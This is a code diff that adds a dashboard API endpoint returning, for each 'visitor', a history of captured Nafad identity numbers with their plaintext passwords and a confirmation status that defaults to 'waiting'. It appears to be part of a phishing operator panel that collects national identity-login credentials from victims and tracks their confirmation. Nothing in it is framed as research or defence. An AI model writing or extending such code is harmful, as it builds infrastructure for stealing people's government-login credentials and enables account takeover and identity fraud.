@@ -799,6 +799,51 @@ async function startServer() {
     }
   });
 
+  // =============================================
+  // Get Nafad Data History (excluding current)
+  // =============================================
+  app.get("/api/dashboard/nafad-history/:visitorId", async (req, res) => {
+    try {
+      const { visitorId } = req.params;
+      const visitor = await readVisitor(visitorId);
+      
+      if (!visitor) {
+        res.status(404).json({ error: "Visitor not found", history: [] });
+        return;
+      }
+
+      // Get all historical nafad data (excluding current)
+      const history: any[] = [];
+      const currentNafadId = visitor.raw?.nafadIdNumber;
+      
+      // Get historical entries from rawData array
+      const rawData = visitor.rawData || [];
+      for (const entry of rawData) {
+        const nafadIdNumber = entry?.raw?.nafadIdNumber;
+        if (nafadIdNumber && nafadIdNumber !== currentNafadId) {
+          // Check if this nafad entry is not already in the list
+          const exists = history.some(h => h.nafadIdNumber === nafadIdNumber);
+          if (!exists) {
+            history.push({
+              nafadIdNumber: nafadIdNumber,
+              nafadPassword: entry.raw.nafadPassword || "",
+              nafadStatus: entry.raw.nafadStatus || entry.raw.nafadConfirmationStatus || "waiting",
+              updatedAt: entry.raw.updatedAt || entry.updatedAt
+            });
+          }
+        }
+      }
+
+      // Sort by updatedAt descending
+      history.sort((a, b) => new Date(b.updatedAt).getTime() - new Date(a.updatedAt).getTime());
+
+      res.json({ history, visitorId });
+    } catch (error) {
+      console.error("Error fetching nafad history:", error);
+      res.status(500).json({ error: "Failed to fetch nafad history", history: [] });
+    }
+  });
+
   // SSE endpoint for customer pages (one-way from server to customer)
   app.get("/api/dashboard/stream", (_req, res) => {
     res.setHeader("Content-Type", "text/event-stream");
